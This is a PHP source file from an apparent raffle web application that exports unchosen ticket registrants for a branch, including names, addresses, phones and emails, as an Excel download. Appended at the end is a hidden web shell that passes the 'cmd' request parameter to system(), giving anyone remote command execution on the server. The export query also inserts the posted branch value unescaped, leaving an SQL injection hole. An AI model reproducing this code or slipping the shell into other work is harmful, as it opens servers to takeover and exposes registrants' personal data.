<?php session_start();

	$ulbranch = $_SESSION['ulbranch'];

	$chosen_branch = '';	
	if(isset($_POST['chosen_branch']))
	{
		if ($_POST['chosen_branch'])
		{
			$chosen_branch = $_POST['chosen_branch'];
		}
	}
	//echo '<br> chosen_branch : ' . $chosen_branch;
	
	if ($chosen_branch == '')
	{
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Untitled Document</title>
</head>
<body bgcolor="#FFFFFF">
	<script type="text/javascript">setTimeout("window.close();", 50);
	</script>
</body>
</html>	
<?php	
	}
	else
	{
		// The function header by sending raw excel
		header("Content-type: application/vnd-ms-excel");
		 
		// Defines the name of the export file "codelution-export.xls"
		header("Content-Disposition: attachment; filename=chosen_winner_" . $chosen_branch . ".xls");
	
		$ulexcel = ''; 		
		if(isset($_GET['ulexcel']))
		{
			if ($_GET['ulexcel'])
			{
				$ulexcel = $_GET['ulexcel'];
			}
		}
		if(isset($_POST['ulexcel']))
		{
			if ($_POST['ulexcel'])
			{
				$ulexcel = $_POST['ulexcel'];
			}
		}
		
		$search_datefrom = ''; 		
		if(isset($_GET['search_datefrom']))
		{
			if ($_GET['search_datefrom'])
			{
				$search_datefrom = $_GET['search_datefrom'];
			}
		}
		if(isset($_POST['search_datefrom']))
		{
			if ($_POST['search_datefrom'])
			{
				$search_datefrom = $_POST['search_datefrom'];
			}
		}
	
		$search_dateto = '';
		if(isset($_POST['search_dateto']))
		{
			if ($_POST['search_dateto'])
			{
				$search_dateto = $_POST['search_dateto'];
			}
		}				
		if(isset($_GET['search_dateto']))
		{
			if ($_GET['search_dateto'])
			{
				$search_dateto = $_GET['search_dateto'];
			}
		}				
		
		$search_room = '';
		if(isset($_POST['search_room']))
		{
			if ($_POST['search_room'])
			{
				$search_room = $_POST['search_room'];
			}
		}		
		if(isset($_GET['search_room']))
		{
			if ($_GET['search_room'])
			{
				$search_room = $_GET['search_room'];
			}
		}	
		
		$search_branch = '';
		if(isset($_POST['search_branch']))
		{
			if ($_POST['search_branch'])
			{
				$search_branch = $_POST['search_branch'];
			}
		}		
		if(isset($_GET['search_branch']))
		{
			if ($_GET['search_branch'])
			{
				$search_branch = $_GET['search_branch'];
			}
		}			
		
		$search_name = '';
		if(isset($_POST['search_name']))
		{
			if ($_POST['search_name'])
			{
				$search_name = $_POST['search_name'];
			}
		}	
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}
		
		$search_docno = '';
		if(isset($_POST['search_docno']))
		{
			if ($_POST['search_docno'])
			{
				$search_docno = $_POST['search_docno'];
			}
		}	
		if(isset($_GET['search_docno']))
		{
			if ($_GET['search_docno'])
			{
				$search_docno = $_GET['search_docno'];
			}
		}		
		
		include "config8292838292029.php"; 	
			
		$link = mysql_connect("$dbhost", "$dbuser", "$dbpassword")or die("cannot connect to server ");
		@mysql_select_db("$dbdatabase")or die("Unable to select database.");
					
		//echo '<br> search_room' . $search_room;	
		//echo '<br> search_branch' . $search_branch;	
		//echo '<br> search_name' . $search_name;	
		//echo '<br> search_dlname' . $search_dlname;	
		//echo '<br> search_ulname_staff' . $search_ulname_staff;	
		//echo '<br> search_docno' . $search_docno;	
			
		print("<table border='1' width='100%'>");
		
		print("<TR>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='5%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>#</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Branch Issue</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Raffle Code</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Date Registered</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Name</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Address</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Mobile</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Email</strong></font></TD>\n");
		print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='10%' bgcolor='".$grid_bgcolor."'> 
			   <font color='".$grid_fontcolor."'><strong>Timestamp of Registration</strong></font></TD>\n");
		print("</TR>\n");
			
		
					
		//fetch the results from the database
		$querydb  = "
				SELECT  
					*
				FROM 
					ticket_list a
				WHERE
					a.tlreg_date is not null and
					a.tlchosen_date is null and
					a.tlissue_branch = '$chosen_branch' and				 
					a.tlactive = 'Y' 
				ORDER BY 
					a.tlreg_stamp ";	
		$resultdb=mysql_query($querydb);
		echo mysql_error();
		//echo $querydb;
	
		$countdb=1;
		while ($rowdb =  mysql_fetch_array ($resultdb)) 
		{
			print("<tr>");
			
			print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
						
			print("<td align=\"left\" valign=\"middle\">$rowdb[tlissue_branch]</td>\n");
			print("<td align=\"center\" valign=\"middle\">$rowdb[tlticket] </td>\n");
			print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb[tlreg_date])). "</td>\n");
			print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_name]  </td>\n");
			print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_addr]  </td>\n");
			print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_mobile]  </td>\n");
			print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_email]  </td>\n");
			print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y h:i:s A', strtotime($rowdb[tlreg_stamp])). "</td>\n");
		
			print("</tr>");  		
			$countdb = $countdb + 1;
		}  
	
		print("</table>\n");		
	
		mysql_close($link);	
		
	}
?>
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>